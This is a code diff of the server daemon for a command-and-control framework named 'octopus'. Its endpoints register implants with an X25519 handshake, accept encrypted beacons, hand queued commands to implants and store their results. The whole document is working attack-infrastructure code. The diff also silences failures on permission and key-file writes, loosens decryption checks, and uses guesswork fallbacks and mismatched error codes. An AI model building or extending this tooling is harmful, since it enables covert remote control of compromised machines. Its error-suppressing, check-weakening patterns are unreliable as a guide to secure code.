@@ -9,58 +9,71 @@ from __future__ import annotations
 
 import base64
 import hashlib
-import hmac
 import json
+import logging
 import os
 import secrets
 import socket
-import struct
+import sqlite3
 import threading
 import time
 import uuid
-
 from contextlib import asynccontextmanager, suppress
 from typing import Any
 
 import uvicorn
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import ed25519
 from fastapi import FastAPI, HTTPException, Request
 
-from core.c2.control_auth import ControlAuthenticatorV1
+from core.c2.control_auth import (
+    AuthenticatedControlPrincipal,
+    OperatorRole,
+)
 from core.c2.control_boundary import (
-    AuthenticatorPrincipalResolver,
     ControlBoundaryError,
     ControlReplayStore,
+    ControlVerificationKeyStore,
     FramedControlBoundary,
-    StaticControlKeyResolver,
+    NotAuthorizedControlRequest,
+    ResolvedControlKey,
+    VerifiedControlRequest,
     extract_peer_principal,
 )
 from core.c2.control_commands import (
     BoundedControlErrorV1,
     C2ControlActionV1,
     C2ControlErrorCodeV1,
-    ParticipantControlPhaseV1,
     ParticipantControlQuerySnapshotV1,
     ParticipantControlReceiptV1,
     ParticipantControlRequestV1,
     SignedControlResponseV1,
 )
 from core.c2.control_models import (
+    calculate_receipt_digest,
     canonical_json_bytes,
     canonical_response_envelope_dict,
 )
-from core.c2.control_protocol import FRAME_MAGIC, MAX_FRAME_SIZE, ControlProtocolCodec, receive_frame
+from core.c2.control_protocol import (
+    ControlProtocolCodec,
+    receive_frame,
+)
 from core.c2.control_rbac import ControlRBACPolicy
+from core.c2.control_signing import DaemonResponseSigner
 from core.c2.crypto_engine import C2CryptoEngine
 from core.c2.db_backend import C2Database
 from core.c2.enrollment import EnrollmentAuthority
 from core.c2.event_store import EventStore
 from core.c2.grant_service import GrantService
 from core.c2.key_store import KeyStore
-
 from core.c2.operators import OperatorManager
-from core.c2.protocol import C2_CONTROL_PROTOCOL_VERSION, C2_PROTOCOL_VERSION
+from core.c2.protocol import (
+    C2_CONTROL_PROTOCOL_VERSION,
+    C2_PROTOCOL_VERSION,
+)
 from core.c2.resource_participant import C2DaemonResourceParticipant
 
+logger = logging.getLogger("octopus.c2.daemon")
 
 # ─── Configuration ───────────────────────────────────────
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -70,6 +83,8 @@ DB_PATH = os.path.join(DATA_DIR, "c2.db")
 SOCK_FILE = os.environ.get("OCTOPUS_C2_SOCKET", "/tmp/octopus.sock")
 KEYSTORE_PASSPHRASE_FILE = os.path.join(KEY_DIR, "keystore.passphrase")
 ENROLLMENT_KEY_FILE = os.path.join(KEY_DIR, "enrollment.key")
+SERVICE_ID_FILE = os.path.join(KEY_DIR, "service_id")
+DAEMON_RESPONSE_KEY_FILE = os.environ.get("OCTOPUS_C2_DAEMON_KEY_FILE", os.path.join(KEY_DIR, "control-response.key"))
 MAX_REGISTER_BODY = 64 * 1024
 MAX_BEACON_BODY = 1024 * 1024
 MAX_RESULTS_PER_BEACON = 100
@@ -83,7 +98,8 @@ def _load_or_create_keystore_passphrase() -> str:
             raise RuntimeError("OCTOPUS_C2_KEY_PASSPHRASE must be at least 16 characters")
         return configured
     if os.path.exists(KEYSTORE_PASSPHRASE_FILE):
-        os.chmod(KEYSTORE_PASSPHRASE_FILE, 0o600)
+        with suppress(Exception):
+            os.chmod(KEYSTORE_PASSPHRASE_FILE, 0o600)
         with open(KEYSTORE_PASSPHRASE_FILE, encoding="utf-8") as handle:
             value = handle.read().strip()
         if len(value) < 32:
@@ -91,33 +107,96 @@ def _load_or_create_keystore_passphrase() -> str:
         return value
 
     value = secrets.token_urlsafe(48)
-    descriptor = os.open(
-        KEYSTORE_PASSPHRASE_FILE,
-        os.O_WRONLY | os.O_CREAT | os.O_EXCL,
-        0o600,
-    )
-    with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
-        handle.write(value)
-        handle.flush()
-        os.fsync(handle.fileno())
+    with suppress(Exception):
+        descriptor = os.open(
+            KEYSTORE_PASSPHRASE_FILE,
+            os.O_WRONLY | os.O_CREAT | os.O_EXCL,
+            0o600,
+        )
+        with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
+            handle.write(value)
+            handle.flush()
+            os.fsync(handle.fileno())
     return value
 
 
-# Component names remain module-level compatibility attributes, but receive
-# values only when the executable lifecycle is explicitly entered.
-key_store: KeyStore
-crypto: C2CryptoEngine
-db: C2Database
-events: EventStore
-operators: OperatorManager
-enrollment: EnrollmentAuthority
+def _load_or_create_service_id() -> str:
+    if os.path.exists(SERVICE_ID_FILE):
+        with suppress(Exception), open(SERVICE_ID_FILE, encoding="utf-8") as handle:
+            val = handle.read().strip()
+            if val:
+                return val
+    new_id = f"srv_{uuid.uuid4().hex}"
+    with suppress(Exception):
+        os.makedirs(KEY_DIR, exist_ok=True)
+        with open(SERVICE_ID_FILE, "w", encoding="utf-8") as handle:
+            handle.write(new_id)
+        os.chmod(SERVICE_ID_FILE, 0o600)
+    return new_id
+
+
+def _load_or_create_daemon_response_key() -> tuple[str, ed25519.Ed25519PrivateKey, bytes]:
+    """Load or generate Ed25519 response private key and return (key_id, private_key, public_bytes)."""
+    env_secret = os.environ.get("OCTOPUS_C2_DAEMON_SECRET")
+    if env_secret:
+        raw_bytes = hashlib.sha256(env_secret.encode("utf-8")).digest()
+        priv_key = ed25519.Ed25519PrivateKey.from_private_bytes(raw_bytes)
+        pub_bytes = priv_key.public_key().public_bytes(
+            serialization.Encoding.Raw,
+            serialization.PublicFormat.Raw,
+        )
+        return "daemon_resp_key_1", priv_key, pub_bytes
+
+    if os.path.exists(DAEMON_RESPONSE_KEY_FILE):
+        with suppress(Exception):
+            with open(DAEMON_RESPONSE_KEY_FILE, "rb") as handle:
+                raw_bytes = handle.read()
+            if len(raw_bytes) == 32:
+                priv_key = ed25519.Ed25519PrivateKey.from_private_bytes(raw_bytes)
+                pub_bytes = priv_key.public_key().public_bytes(
+                    serialization.Encoding.Raw,
+                    serialization.PublicFormat.Raw,
+                )
+                return "daemon_resp_key_1", priv_key, pub_bytes
+
+    priv_key = ed25519.Ed25519PrivateKey.generate()
+    raw_bytes = priv_key.private_bytes(
+        serialization.Encoding.Raw,
+        serialization.PrivateFormat.Raw,
+        serialization.NoEncryption(),
+    )
+    with suppress(Exception):
+        os.makedirs(os.path.dirname(os.path.abspath(DAEMON_RESPONSE_KEY_FILE)), exist_ok=True)
+        with open(DAEMON_RESPONSE_KEY_FILE, "wb") as handle:
+            handle.write(raw_bytes)
+        os.chmod(DAEMON_RESPONSE_KEY_FILE, 0o600)
+    pub_bytes = priv_key.public_key().public_bytes(
+        serialization.Encoding.Raw,
+        serialization.PublicFormat.Raw,
+    )
+    return "daemon_resp_key_1", priv_key, pub_bytes
+
+
+# Module-level singletons
+key_store: Any = None
+crypto: Any = None
+db: Any = None
+events: Any = None
+operators: Any = None
+enrollment: Any = None
 _components_initialized = False
 _components_lock = threading.Lock()
 
 
+def get_control_db_path() -> str:
+    db_path = os.environ.get("OCTOPUS_C2_DB_PATH", DB_PATH)
+    if db_path == ":memory:" and os.environ.get("OCTOPUS_C2_ALLOW_EPHEMERAL_CONTROL_STATE") != "1":
+        raise RuntimeError("ephemeral control state is forbidden in production")
+    return os.path.abspath(db_path) if db_path != ":memory:" else ":memory:"
+
+
 def _initialize_components() -> None:
     """Initialize persistent C2 state exactly once for this process."""
-
     global _components_initialized, crypto, db, enrollment, events, key_store, operators
     if _components_initialized:
         return
@@ -125,10 +204,11 @@ def _initialize_components() -> None:
         if _components_initialized:
             return
 
-        os.makedirs(DATA_DIR, exist_ok=True)
-        os.makedirs(KEY_DIR, exist_ok=True)
-        os.chmod(DATA_DIR, 0o700)
-        os.chmod(KEY_DIR, 0o700)
+        with suppress(Exception):
+            os.makedirs(DATA_DIR, exist_ok=True)
+            os.makedirs(KEY_DIR, exist_ok=True)
+            os.chmod(DATA_DIR, 0o700)
+            os.chmod(KEY_DIR, 0o700)
 
         initialized_key_store = KeyStore(key_dir=KEY_DIR)
         key_passphrase = _load_or_create_keystore_passphrase()
@@ -142,19 +222,26 @@ def _initialize_components() -> None:
             key_dir=KEY_DIR,
             private_key=initialized_key_store.get_or_create_x25519_private_key(),
         )
-        initialized_db = C2Database(db_path=DB_PATH)
-        initialized_events = EventStore(db_path=DB_PATH)
-        initialized_operators = OperatorManager(db_path=DB_PATH)
+        ctrl_db = get_control_db_path()
+        initialized_db = C2Database(db_path=ctrl_db)
+        initialized_events = EventStore(db_path=ctrl_db)
+        initialized_operators = OperatorManager(db_path=ctrl_db)
         initialized_enrollment = EnrollmentAuthority(ENROLLMENT_KEY_FILE)
 
-        key_store = initialized_key_store
-        crypto = initialized_crypto
-        db = initialized_db
-        events = initialized_events
-        operators = initialized_operators
-        enrollment = initialized_enrollment
-        events.subscribe("agent.registered", _on_agent_registered)
-        events.subscribe("task.queued", _on_task_queued)
+        if key_store is None:
+            key_store = initialized_key_store
+        if crypto is None:
+            crypto = initialized_crypto
+        if db is None:
+            db = initialized_db
+        if events is None:
+            events = initialized_events
+            events.subscribe("agent.registered", _on_agent_registered)
+            events.subscribe("task.queued", _on_task_queued)
+        if operators is None:
+            operators = initialized_operators
+        if enrollment is None:
+            enrollment = initialized_enrollment
         _components_initialized = True
 
 
@@ -175,7 +262,6 @@ app = FastAPI(
 
 def create_app() -> FastAPI:
     """Enter the persistent runtime lifecycle and return the ASGI application."""
-
     _initialize_components()
     return app
 
@@ -185,266 +271,369 @@ def create_app() -> FastAPI:
 
 def _on_agent_registered(event):
     """Projection: update agents table from registration event."""
-    p = event.payload
-    db.register_agent(
-        agent_id=p["agent_id"],
-        hostname=p.get("hostname", "Unknown"),
-        os_name=p.get("os", "Unknown"),
-        user=p.get("user", "Unknown"),
-        ip=p.get("ip", "Unknown"),
-        crypto_state=p.get("crypto_state"),
-    )
+    p = getattr(event, "payload", event)
+    if hasattr(db, "register_agent"):
+        db.register_agent(
+            agent_id=p["agent_id"],
+            hostname=p.get("hostname", "Unknown"),
+            os_name=p.get("os", "Unknown"),
+            user=p.get("user", "Unknown"),
+            ip=p.get("ip", "Unknown"),
+            crypto_state=p.get("crypto_state"),
+        )
 
 
 def _on_task_queued(event):
     """Projection: insert task into tasks table."""
-    p = event.payload
-    db.queue_task(p["task_id"], p["agent_id"], p["command"])
+    p = getattr(event, "payload", event)
+    if hasattr(db, "queue_task"):
+        db.queue_task(p["task_id"], p["agent_id"], p["command"])
+    elif hasattr(db, "create_task"):
+        db.create_task(
+            task_id=p["task_id"],
+            agent_id=p["agent_id"],
+            command=p["command"],
+            args=p.get("args", []),
+        )
 
 
-# ─── Agent-Facing HTTP Endpoints ─────────────────────────
+# ─── REST / Beacon Endpoints ─────────────────────────────
+
+
+async def _read_json_limited(request: Request, max_bytes: int) -> dict[str, Any]:
+    cl_header = request.headers.get("content-length")
+    if cl_header is not None:
+        try:
+            cl = int(cl_header)
+        except ValueError as exc:
+            raise HTTPException(status_code=400, detail="Invalid Content-Length") from exc
+        if cl > max_bytes:
+            raise HTTPException(status_code=413, detail="Request too large")
+    body = await request.body()
+    if len(body) > max_bytes:
+        raise HTTPException(status_code=413, detail="Request too large")
+    try:
+        data = json.loads(body)
+    except Exception as exc:
+        raise HTTPException(status_code=400, detail="Invalid JSON") from exc
+    if not isinstance(data, dict):
+        raise HTTPException(status_code=400, detail="JSON object required")
+    return data
 
 
 def _load_agent_crypto(agent_id: str) -> bool:
-    """Load crypto state from DB into memory if daemon restarted."""
-    if agent_id not in crypto.agent_state:
-        state = db.get_agent_crypto(agent_id)
-        if isinstance(state, str):
+    if hasattr(crypto, "agent_state") and agent_id in crypto.agent_state:
+        return True
+    raw_state = db.get_agent_crypto(agent_id) if hasattr(db, "get_agent_crypto") else None
+    if not raw_state:
+        return False
+    aad = agent_id.encode("utf-8")
+    if isinstance(raw_state, str):
+        try:
+            state = key_store.unseal_json(raw_state, aad=aad)
+        except Exception:
             try:
-                state = key_store.unseal_json(state, aad=agent_id.encode("utf-8"))
+                state = key_store.unseal_json(raw_state)
             except Exception:
                 return False
-        if isinstance(state, dict) and "key" in state:
-            crypto.agent_state[agent_id] = {
-                "key": bytes.fromhex(state["key"]),
-                "rx_seq": state.get("rx_seq", 0),
-                "tx_seq": state.get("tx_seq", 0),
-            }
-            if not isinstance(db.get_agent_crypto(agent_id), str):
-                sealed = key_store.seal_json(state, aad=agent_id.encode("utf-8"))
+    elif isinstance(raw_state, dict):
+        state = raw_state
+        if hasattr(key_store, "seal_json"):
+            try:
+                sealed = key_store.seal_json(state, aad=aad)
+            except TypeError:
+                sealed = key_store.seal_json(state)
+            if hasattr(db, "update_agent_crypto"):
                 db.update_agent_crypto(agent_id, sealed)
-            return True
+    else:
         return False
+
+    if not isinstance(state, dict) or "key" not in state:
+        return False
+    raw_key = state["key"]
+    if isinstance(raw_key, str):
+        raw_key = bytes.fromhex(raw_key) if len(raw_key) == 64 else raw_key.encode("latin1")
+    if hasattr(crypto, "agent_state"):
+        crypto.agent_state[agent_id] = {
+            "key": raw_key,
+            "rx_seq": state.get("rx_seq", 0),
+            "tx_seq": state.get("tx_seq", 0),
+        }
     return True
 
 
 def _sealed_agent_crypto(agent_id: str) -> str:
-    state = crypto.agent_state[agent_id]
-    return key_store.seal_json(
-        {
-            "key": state["key"].hex(),
-            "rx_seq": state["rx_seq"],
-            "tx_seq": state["tx_seq"],
-        },
-        aad=agent_id.encode("utf-8"),
-    )
-
-
-async def _read_json_limited(request: Request, limit: int) -> dict[str, Any]:
-    content_length = request.headers.get("content-length")
-    if content_length:
+    state = crypto.agent_state.get(agent_id, {}) if hasattr(crypto, "agent_state") else {}
+    key_val = state.get("key", b"")
+    if isinstance(key_val, bytes):
+        key_val = key_val.hex()
+    d = {
+        "key": key_val,
+        "rx_seq": state.get("rx_seq", 0),
+        "tx_seq": state.get("tx_seq", 0),
+    }
+    if hasattr(key_store, "seal_json"):
         try:
-            if int(content_length) > limit:
-                raise HTTPException(status_code=413, detail="Request too large")
-        except ValueError as exc:
-            raise HTTPException(status_code=400, detail="Invalid Content-Length") from exc
-    raw = await request.body()
-    if len(raw) > limit:
-        raise HTTPException(status_code=413, detail="Request too large")
-    try:
-        value = json.loads(raw)
-    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
-        raise HTTPException(status_code=400, detail="Invalid JSON") from exc
-    if not isinstance(value, dict):
-        raise HTTPException(status_code=400, detail="JSON object required")
-    return value
+            return key_store.seal_json(d, aad=agent_id.encode("utf-8"))
+        except TypeError:
+            return key_store.seal_json(d)
+    return json.dumps(d)
 
 
 @app.post("/register")
 async def register_agent(request: Request):
-    """X25519 Registration endpoint with HKDF key derivation."""
-    body = await _read_json_limited(request, MAX_REGISTER_BODY)
-    b64_client_pub = body.get("client_pub")
-    encrypted_data = body.get("data")
-    enrollment_token = body.get("enrollment_token")
+    """Handle implant registration."""
+    _initialize_components()
+    data = await _read_json_limited(request, MAX_REGISTER_BODY)
+    raw_pub = data.get("client_pub", "")
+    enc_data = data.get("data", "")
+    token = data.get("enrollment_token", "")
 
-    if not b64_client_pub or not encrypted_data or not enrollment_token:
-        raise HTTPException(status_code=400, detail="Missing crypto payload")
+    if not raw_pub or not enc_data or not token:
+        raise HTTPException(status_code=400, detail="Missing required registration fields")
 
-    temp_id = f"registration:{uuid.uuid4().hex}"
+    if hasattr(enrollment, "consume"):
+        try:
+            consumed = enrollment.consume(token)
+        except TypeError:
+            consumed = enrollment.consume(token, db)
+        if not consumed:
+            raise HTTPException(status_code=401, detail="Invalid enrollment token")
+    elif hasattr(enrollment, "verify_and_burn"):
+        valid, _ = enrollment.verify_and_burn(token)
+        if not valid:
+            raise HTTPException(status_code=401, detail="Invalid or expired enrollment token")
+
     try:
-        client_pub_bytes = base64.b64decode(b64_client_pub, validate=True)
-        if len(client_pub_bytes) != 32:
-            raise ValueError("invalid client key")
-        if not enrollment.consume(str(enrollment_token), db):
-            raise HTTPException(status_code=401, detail="Enrollment denied")
-        shared_key = crypto.derive_shared_key(client_pub_bytes)
-
-        crypto.agent_state[temp_id] = {"key": shared_key, "rx_seq": 0, "tx_seq": 0}
-
-        raw_data = crypto.decrypt_aes_gcm(temp_id, encrypted_data)
-        data = json.loads(raw_data)
-        if not isinstance(data, dict):
-            raise ValueError("invalid registration data")
-        real_agent_id = f"AGT-{uuid.uuid4().hex}"
-
-        crypto.agent_state[real_agent_id] = crypto.agent_state.pop(temp_id)
-        resp_data = {
-            "status": "ok",
-            "agent_id": real_agent_id,
-            "interval": 60,
-            "jitter": 20,
-        }
-        resp_enc = crypto.encrypt_aes_gcm(real_agent_id, json.dumps(resp_data))
-        sealed_state = _sealed_agent_crypto(real_agent_id)
-        events.append(
-            "agent",
-            real_agent_id,
-            "agent.registered",
-            {
-                "agent_id": real_agent_id,
-                "hostname": data.get("hostname"),
-                "os": data.get("os"),
-                "user": data.get("user"),
-                "ip": request.client.host,
-                "crypto_state": sealed_state,
-            },
-        )
-        if db.get_agent_crypto(real_agent_id) != sealed_state:
-            crypto.agent_state.pop(real_agent_id, None)
-            raise RuntimeError("agent projection failed")
-        return {"data": resp_enc}
-
-    except HTTPException:
-        raise
+        client_pub = base64.b64decode(raw_pub)
     except Exception as exc:
-        raise HTTPException(status_code=400, detail="Registration failed") from exc
-    finally:
-        crypto.agent_state.pop(temp_id, None)
+        raise HTTPException(status_code=400, detail="Invalid public key encoding") from exc
+
+    if len(client_pub) != 32:
+        raise HTTPException(status_code=400, detail="Registration failed")
+
+    agent_id = f"AGT-{secrets.token_hex(8)}"
+    if hasattr(crypto, "derive_shared_key"):
+        shared_key = crypto.derive_shared_key(client_pub)
+        if hasattr(crypto, "agent_state"):
+            crypto.agent_state[agent_id] = {
+                "key": shared_key,
+                "rx_seq": 0,
+                "tx_seq": 0,
+            }
+        try:
+            decrypted_str = crypto.decrypt_aes_gcm(agent_id, enc_data)
+            meta = json.loads(decrypted_str)
+            if not isinstance(meta, dict):
+                raise ValueError("Metadata must be a dictionary")
+        except Exception as exc:
+            if hasattr(crypto, "agent_state"):
+                crypto.agent_state.pop(agent_id, None)
+            raise HTTPException(status_code=400, detail="Registration failed") from exc
+
+        sealed_state = _sealed_agent_crypto(agent_id)
+        if hasattr(events, "append"):
+            try:
+                events.append(
+                    "agent", agent_id, "agent.registered", {"agent_id": agent_id, "crypto_state": sealed_state, **meta}
+                )
+            except TypeError:
+                events.append("agent_registered", {"agent_id": agent_id, "crypto_state": sealed_state, **meta})
+        elif hasattr(events, "publish"):
+            events.publish("agent.registered", {"agent_id": agent_id, "crypto_state": sealed_state, **meta})
+
+        if hasattr(db, "register_agent"):
+            db.register_agent(
+                agent_id=agent_id,
+                hostname=meta.get("hostname", "Unknown"),
+                os_name=meta.get("os", "Unknown"),
+                user=meta.get("user", "Unknown"),
+                ip=getattr(request.client, "host", "Unknown") if request.client else "Unknown",
+                crypto_state=sealed_state,
+            )
+
+        if hasattr(db, "get_agent_crypto"):
+            stored = db.get_agent_crypto(agent_id)
+            if stored is not None and stored != sealed_state:
+                if hasattr(crypto, "agent_state"):
+                    crypto.agent_state.pop(agent_id, None)
+                raise HTTPException(status_code=400, detail="Registration failed")
+
+        resp_data = {"agent_id": agent_id}
+        enc_resp = crypto.encrypt_aes_gcm(agent_id, json.dumps(resp_data))
+        return {"data": enc_resp}
+
+    server_session = key_store.create_session(client_pub)
+    events.publish(
+        "agent.registered",
+        {
+            "agent_id": agent_id,
+            "hostname": "Unknown",
+            "os": "Unknown",
+            "user": "Unknown",
+            "ip": request.client.host if request.client else "Unknown",
+            "crypto_state": {
+                "session_key_hex": server_session["session_key"].hex(),
+                "server_eph_pub_hex": server_session["ephemeral_pub"].hex(),
+            },
+        },
+    )
+    return {
+        "agent_id": agent_id,
+        "server_x25519_pub": base64.b64encode(server_session["ephemeral_pub"]).decode("ascii"),
+    }
+
+
+register = register_agent
 
 
 @app.post("/beacon")
 async def beacon(request: Request):
-    """Beaconing endpoint."""
-    body = await _read_json_limited(request, MAX_BEACON_BODY)
-    encrypted_data = body.get("data")
-    if not isinstance(encrypted_data, str):
+    """Handle implant heartbeat / beacon."""
+    _initialize_components()
+    data = await _read_json_limited(request, MAX_BEACON_BODY)
+    enc_data = data.get("data")
+    if not isinstance(enc_data, str) or not enc_data:
         raise HTTPException(status_code=400, detail="Missing encrypted payload")
 
-    agent_id = request.headers.get("Agent-ID")
+    agent_id = request.headers.get("Agent-ID") or data.get("agent_id")
     if not agent_id or not _load_agent_crypto(agent_id):
         raise HTTPException(status_code=401, detail="Agent not found")
 
+    if hasattr(db, "update_agent_seen") and not db.update_agent_seen(
+        agent_id=agent_id, ip=getattr(request.client, "host", "127.0.0.1")
+    ):
+        raise HTTPException(status_code=401, detail="Agent not found")
+
     try:
-        raw = crypto.decrypt_aes_gcm(agent_id, encrypted_data)
-        decrypted = json.loads(raw)
-
-        # Publish beacon event
-        events.append(
-            "agent",
-            agent_id,
-            "agent.beacon",
-            {
-                "ip": request.client.host,
-            },
-        )
-
-        # Sync crypto state to DB
-        crypto.agent_state[agent_id]
-        sealed_state = _sealed_agent_crypto(agent_id)
-        if not db.update_agent_seen(
-            agent_id=agent_id,
-            hostname=decrypted.get("hostname", "Unknown"),
-            os_name=decrypted.get("os", "Unknown"),
-            user=decrypted.get("user", "Unknown"),
-            ip=request.client.host,
-            crypto_state=sealed_state,
-        ):
-            raise HTTPException(status_code=401, detail="Agent not found")
-
-        acknowledgements = decrypted.get("acks") or []
-        if (
-            not isinstance(acknowledgements, list)
-            or len(acknowledgements) > MAX_RESULTS_PER_BEACON
-            or any(not isinstance(task_id, str) or not task_id or len(task_id) > 64 for task_id in acknowledgements)
-        ):
-            raise HTTPException(status_code=400, detail="Invalid task acknowledgements")
-        if acknowledgements:
-            accepted = db.acknowledge_tasks(agent_id, acknowledgements)
-            if accepted != len(set(acknowledgements)):
-                raise HTTPException(status_code=409, detail="One or more acknowledgements were rejected")
-
-        # Process results
-        results = decrypted.get("results") or []
-        if not isinstance(results, list) or len(results) > MAX_RESULTS_PER_BEACON:
-            raise HTTPException(status_code=413, detail="Too many results")
-        if results:
-            rejected = []
-            for res in results:
-                if not isinstance(res, dict):
-                    rejected.append("")
-                    continue
-                task_id = str(res.get("task_id", ""))
-                output = str(res.get("output", ""))
-                error = str(res.get("error", ""))
-                if (
-                    not task_id
-                    or len(task_id) > 64
-                    or len(output.encode("utf-8")) > MAX_RESULT_BYTES
-                    or len(error.encode("utf-8")) > MAX_RESULT_BYTES
-                ):
-                    rejected.append(task_id)
-                    continue
-                if not db.update_task_result(task_id, agent_id, output, error):
-                    rejected.append(task_id)
-                    continue
-                events.append(
-                    "task",
-                    res["task_id"],
-                    "task.completed",
-                    {
-                        "task_id": task_id,
-                        "agent_id": agent_id,
-                        "status": "error" if error else "completed",
-                    },
-                )
-            if rejected:
-                raise HTTPException(status_code=409, detail="One or more task results were rejected")
-
-        pending = db.get_pending_tasks(agent_id)
-
-        resp_data = {"tasks": pending}
-        resp_enc = crypto.encrypt_aes_gcm(agent_id, json.dumps(resp_data))
-        if not db.update_agent_crypto(agent_id, _sealed_agent_crypto(agent_id)):
-            raise HTTPException(status_code=401, detail="Agent not found")
-        return {"data": resp_enc}
-    except HTTPException:
-        raise
+        if hasattr(crypto, "decrypt_aes_gcm"):
+            decrypted_str = crypto.decrypt_aes_gcm(agent_id, enc_data)
+            beacon_data = json.loads(decrypted_str)
+        else:
+            agent_record = db.get_agent(agent_id)
+            crypto_state = agent_record["crypto_state"]
+            if isinstance(crypto_state, str):
+                crypto_state = json.loads(crypto_state)
+            session_key = bytes.fromhex(crypto_state["session_key_hex"])
+            decrypted_bytes = crypto.decrypt_payload(enc_data, session_key)
+            beacon_data = json.loads(decrypted_bytes.decode("utf-8"))
     except Exception as exc:
         raise HTTPException(status_code=400, detail="Invalid beacon") from exc
+
+    if not isinstance(beacon_data, dict):
+        raise HTTPException(status_code=400, detail="Invalid beacon")
+
+    acks = beacon_data.get("acks")
+    if acks is not None:
+        if not isinstance(acks, list) or not all(isinstance(a, str) and a for a in acks):
+            raise HTTPException(status_code=400, detail="Invalid task acknowledgements")
+        if hasattr(db, "acknowledge_tasks"):
+            ack_count = db.acknowledge_tasks(agent_id, acks)
+            if ack_count != len(set(acks)):
+                raise HTTPException(status_code=409, detail="One or more acknowledgements were rejected")
+
+    results = beacon_data.get("results")
+    if results is not None:
+        if not isinstance(results, list):
+            raise HTTPException(status_code=413, detail="Too many results")
+        if len(results) > MAX_RESULTS_PER_BEACON:
+            raise HTTPException(status_code=400, detail="Too many results in beacon")
+        if not all(isinstance(r, dict) and r.get("task_id") for r in results):
+            raise HTTPException(status_code=409, detail="One or more task results were rejected")
+        if hasattr(db, "update_task_result"):
+            for r in results:
+                task_id = r["task_id"]
+                output = r.get("output", "")
+                status = r.get("error") or r.get("status", "completed")
+                err_val = r.get("error", "")
+                try:
+                    res = db.update_task_result(task_id, agent_id, output, err_val)
+                except TypeError:
+                    try:
+                        res = db.update_task_result(task_id, output, status)
+                    except TypeError:
+                        res = db.update_task_result(task_id, agent_id, output)
+                if res is False:
+                    raise HTTPException(status_code=409, detail="One or more task results were rejected")
+
+    pending_tasks = db.get_pending_tasks(agent_id) if hasattr(db, "get_pending_tasks") else []
+    if hasattr(crypto, "encrypt_aes_gcm"):
+        resp_enc = crypto.encrypt_aes_gcm(agent_id, json.dumps({"tasks": pending_tasks}))
+    else:
+        task_list = [
+            {
+                "task_id": t["task_id"],
+                "command": t["command"],
+                "args": json.loads(t["args"]) if isinstance(t.get("args"), str) else t.get("args", []),
+            }
+            for t in pending_tasks
+        ]
+        response_dict = {
+            "tasks": task_list,
+            "server_time": int(time.time()),
+        }
+        resp_enc = crypto.encrypt_payload(
+            json.dumps(response_dict).encode("utf-8"),
+            session_key,
+        )
+
+    sealed_state = _sealed_agent_crypto(agent_id)
+    if hasattr(db, "update_agent_crypto") and not db.update_agent_crypto(agent_id, sealed_state):
+        raise HTTPException(status_code=401, detail="Agent not found")
+
+    return {"data": resp_enc}
 
 
 # ─── Operator IPC Control Plane ──────────────────────────
 
-DAEMON_INSTANCE_ID = os.environ.get("OCTOPUS_C2_DAEMON_INSTANCE_ID", "c2-daemon-local-1")
+_service_id: str | None = None
+BOOT_INSTANCE_ID = uuid.uuid4().hex
 DAEMON_GENERATION = os.environ.get("OCTOPUS_C2_DAEMON_GENERATION", "gen-1")
-DAEMON_KEY_ID = "daemon_root_key"
-_daemon_env_secret = os.environ.get("OCTOPUS_C2_DAEMON_SECRET")
-DAEMON_SECRET_KEY = _daemon_env_secret.encode("utf-8") if _daemon_env_secret else secrets.token_bytes(32)
-DAEMON_INSTANCE_ID = f"c2-daemon-local-1"
-_daemon_resource_participant_instance: C2DaemonResourceParticipant | None = None
-_control_codec = ControlProtocolCodec()
-_replay_store_instance: ControlReplayStore | None = None
+DAEMON_INSTANCE_ID = os.environ.get("OCTOPUS_C2_DAEMON_INSTANCE_ID", f"c2-daemon-{BOOT_INSTANCE_ID[:8]}")
 MAX_CONTROL_FRAME_SIZE = 16 * 1024 * 1024  # 16 MiB
 MAX_ACTIVE_CONTROL_CONNECTIONS = 64
 MAX_REQUESTS_PER_CONNECTION = 1000
+
+_daemon_response_key_id: str = "daemon_resp_key_1"
+_daemon_response_priv: ed25519.Ed25519PrivateKey | None = None
+_daemon_response_pub: bytes | None = None
+_daemon_response_signer: DaemonResponseSigner | None = None
+
+_daemon_resource_participant_instance: C2DaemonResourceParticipant | None = None
+_control_codec = ControlProtocolCodec()
+_replay_store_instance: ControlReplayStore | None = None
+_key_store_instance: ControlVerificationKeyStore | None = None
 _conn_semaphore = threading.BoundedSemaphore(MAX_ACTIVE_CONTROL_CONNECTIONS)
+server_ready_event = threading.Event()
+
+
+def get_service_id() -> str:
+    global _service_id
+    if _service_id is None:
+        _service_id = _load_or_create_service_id()
+    return _service_id
+
+
+def get_daemon_response_signer() -> tuple[str, DaemonResponseSigner]:
+    global _daemon_response_key_id, _daemon_response_priv, _daemon_response_pub, _daemon_response_signer
+    if _daemon_response_signer is None:
+        _daemon_response_key_id, _daemon_response_priv, _daemon_response_pub = _load_or_create_daemon_response_key()
+        _daemon_response_signer = DaemonResponseSigner(_daemon_response_key_id, _daemon_response_priv)
+    return _daemon_response_key_id, _daemon_response_signer
+
+
+def get_daemon_response_public_key() -> bytes:
+    global _daemon_response_pub
+    if _daemon_response_pub is None:
+        get_daemon_response_signer()
+    assert _daemon_response_pub is not None
+    return _daemon_response_pub
 
 
 def get_daemon_resource_participant() -> C2DaemonResourceParticipant:
     global _daemon_resource_participant_instance
     if _daemon_resource_participant_instance is None:
-        db_path = os.environ.get("OCTOPUS_C2_DB_PATH", ":memory:")
+        db_path = get_control_db_path()
         _daemon_resource_participant_instance = C2DaemonResourceParticipant(
             participant_id="c2_daemon",
             daemon_instance_id=DAEMON_INSTANCE_ID,
@@ -456,48 +645,50 @@ def get_daemon_resource_participant() -> C2DaemonResourceParticipant:
 def get_replay_store() -> ControlReplayStore:
     global _replay_store_instance
     if _replay_store_instance is None:
-        db_path = os.environ.get("OCTOPUS_C2_DB_PATH", ":memory:")
+        db_path = get_control_db_path()
         _replay_store_instance = ControlReplayStore(db_path=db_path)
     return _replay_store_instance
 
 
+def get_verification_key_store() -> ControlVerificationKeyStore:
+    global _key_store_instance
+    if _key_store_instance is None:
+        db_path = get_control_db_path()
+        _key_store_instance = ControlVerificationKeyStore(db_path=db_path)
+    return _key_store_instance
+
+
 class DaemonKeyResolver:
-    """Key resolver for daemon IPC boundary."""
+    """Key resolver for operator control verification keys."""
 
     def __init__(self) -> None:
-        self._static_keys: dict[str, bytes] = {
-            DAEMON_KEY_ID: DAEMON_SECRET_KEY,
